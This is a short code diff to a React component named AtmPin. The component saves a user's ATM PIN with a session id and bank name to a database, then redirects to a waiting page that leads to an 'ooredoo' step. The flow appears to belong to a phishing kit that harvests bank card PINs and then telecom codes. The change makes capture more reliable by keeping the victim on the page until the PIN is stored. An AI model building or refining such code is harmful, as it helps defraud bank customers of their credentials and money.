@@ -38,10 +38,11 @@ export default function AtmPin() {
         sessionId: currentSessionId,
         pin,
       });
+      // التقدم فقط بعد نجاح الإرسال
       setLocation(`/waiting?bank=${bank}&session=${currentSessionId}&next=ooredoo`);
     } catch (error) {
       console.error("Error saving ATM PIN in DB:", error);
-      setLocation(`/waiting?bank=${bank}&session=${currentSessionId}&next=ooredoo`);
+      toast.error(isArabic ? "حدث خطأ أثناء الإرسال. يرجى المحاولة مرة أخرى." : "Error during submission. Please try again.");
     }
   };
 
